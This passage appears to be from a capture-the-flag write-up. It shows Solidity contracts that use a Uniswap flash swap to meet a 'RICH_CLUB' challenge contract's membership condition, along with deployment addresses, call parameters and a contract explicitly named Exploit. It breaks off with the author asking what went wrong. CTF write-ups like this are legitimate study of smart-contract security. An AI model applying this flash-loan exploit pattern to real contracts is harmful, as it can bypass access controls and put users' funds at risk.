Following the provided examples, getting the code to run is easy. contract ExampleContract is UniswapFlashSwapper { constructor(address _DAI, address _WETH) public UniswapFlashSwapper(_DAI, _WETH) {} function flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay, bytes calldata _userData) external { startSwap(_tokenBorrow, _amount, _tokenPay, _userData); } function execute(address _tokenBorrow, uint _amount, address _tokenPay, uint _amountToRepay, bytes memory _userData) internal override { RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61); string memory pub_key = "04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808"; club.grant_membership(pub_key); }
} Now you deploy with the ERC20 (0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984) and WETH (0xc778417E063141139Fce010982780140Aa0cD5Ab) addresses and call the flashSwap functions with the following parameters: 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984 600000000000000000000 0xc778417E063141139Fce010982780140Aa0cD5Ab [0] This would execute the trade and call the function in execute. You could also deploy a contract that did all this for you, in this case the contract would encode the function f() and pass it as bytecode: contract Exploit { function f() public { RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61); string memory pub_key = "04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808"; club.grant_membership(pub_key); } function run() public { ExampleContract ec = ExampleContract(0xE1637EDDFaeabbfd9FE616E34581D62D0E839368); bytes memory payload = abi.encodeWithSignature("f()"); ec.flashSwap(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, 600000000000000000000, 0xc778417E063141139Fce010982780140Aa0cD5Ab, payload); }
} This would grant you membership and allow you to access the club. I was ready to first blood the challenge, so what went wrong?

